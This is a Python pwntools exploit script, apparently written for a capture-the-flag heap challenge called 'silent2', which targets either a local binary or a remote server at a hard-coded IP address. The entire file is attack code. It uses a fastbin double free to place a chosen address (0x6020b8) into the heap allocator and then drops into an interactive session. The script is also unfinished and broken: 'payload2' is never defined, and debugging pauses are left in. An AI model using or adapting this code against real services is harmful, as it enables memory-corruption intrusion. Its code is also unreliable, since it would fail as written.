#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
# context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.terminal=["tmux","splitw","-h"]
if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./silent2")

else:
    io = remote("39.107.32.132", 10000)

elf = ELF("./silent2")
#  libc = ELF("")

def DEBUG():
    #  print "pid -> {}".format(proc.pidof(io))
    raw_input("DEBUG: ")
    gdb.attach(io, "set follow-fork-mode parent")

def add(size, payload):
    io.sendline("1")
    sleep(0.1)
    io.sendline(str(size))
    sleep(0.1)
    io.sendline(payload)
    sleep(0.1)

def edit(idx, payload1, payload2):
    io.sendline("3")
    sleep(0.1)
    io.sendline(str(idx))
    sleep(0.1)
    io.sendline(payload1)
    sleep(0.1)
    io.sendline(payload2)
    sleep(0.1)

def delete(idx):
    io.sendline("2")
    sleep(0.1)
    io.sendline(str(idx))


if __name__ == "__main__":
    io.recvuntil("123456789\n")

    add(0x10, '0' * (0x10 - 1))#0
    add(0x10, '0' * (0x10 - 1))#1
    add(0x80, '0' * (0x80- 1))#2
    add(0x80, '0' * (0x80- 1))#3
    add(0x10, '0' * (0x10 - 1))#4
    
    # delete(2)
    delete(0)
    delete(1)
    delete(0)
    add(0x10, p64(0x6020b8))#1
    add(0x10, '0' * (0x10 - 1))#0
    add(0x10, '0' * (0x10 - 1))#0
    gdb.attach(io)
    raw_input()
    add(0x10, '0' * (0x10 - 1))#0

    raw_input()
    
    payload1=p64(0)+p64(0x70)
    edit(2,payload1,payload2)
    delete(3)
    # edit()
    
    
    add(0x80, '0' * (0x80 - 1))
    io.interactive()